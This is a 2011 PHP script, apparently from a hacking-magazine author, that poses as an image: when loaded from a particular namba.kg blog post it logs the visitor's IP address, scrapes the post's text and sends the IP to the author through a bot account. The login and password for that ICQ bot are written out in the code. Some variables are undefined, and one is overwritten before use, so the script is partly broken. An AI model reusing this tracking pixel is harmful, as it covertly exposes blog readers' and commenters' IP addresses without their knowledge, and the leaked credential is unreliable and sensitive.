<?php
###################################################
# IKnowWhoUR: Namba Comment Sender v0.1 beta      #
# © 2011 by Shved								  #
# shved(at)xakep(dot)ru 	 	   			      #
###################################################

 set_time_limit(0); 
 
 $id 	 = '30931';					//ID поста
 $ip     = $_SERVER['REMOTE_ADDR']; //ноу коммент
 //$date = date("F j, Y");
 //$time = date("g:i a");
 $icq    = '190739303';				//ICQ номер, на который хотим получать уведомления
 
 if(isset($_SERVER['HTTP_REFERER']))
 {
 	$referer = trim($_SERVER['HTTP_REFERER']);
 	if($referer == "http://blogs.namba.kg/post.php?id=$id")
 	{
  		$fgc = file_get_contents("http://blogs.namba.kg/post.php?id=$id");
		if($fgc)
		{
			$fp = fopen('blog.txt', 'w');
			$fw = fwrite($fp,$fgc);
				  fclose($fp);
		}		
 	}else exit();
 }

 if(file_exists('blog.txt')){
 	$file = ('result.txt');
 	$fp2  = fopen('blog.txt','r');
 	while(!feof($fp2)){
 		$line = fgets($fp2);
	 	if(preg_match('|<p>(.*)</p>|Uis', $line, $result))
	 	{
	 		foreach($result as $match)
	 		{
	 			file_put_contents($file, $match, FILE_APPEND);
	 		}
	 	}
 	}
 	fclose($fp2);
 }
 if(file_exists('result.txt'))
 {
	include('WebIcqLite.class.php'); //подключаем класс для работы с ICQ..
	
	$comment = "Господин, в вашем блоге #$blog_name# новый коммент.\r\n
				IP комментатора: $ip\r\n
				Никнейм: $name";								
	$comment = iconv("UTF-8","cp1251",$comment);
 	
	define('UIN', 626566206);		//Бот uin  (регаем на icq.com)
	define('PASSWORD', 'wc3dfclm'); //Бот пасс	 
	
	$icq = new WebIcqLite();
	
	if($icq->connect(UIN, PASSWORD))
	{
	   if(!$icq->send_message("$icq", "$comment"))
	   {
	   	$icq->error();
	   }
	}
	$icq->disconnect(); 	
 }
 
 Header("Content-type: image/png"); 
 $im = ImageCreateFromGif('gif.gif');
 ImageGif($im);
 ImageDestroy($im);

?>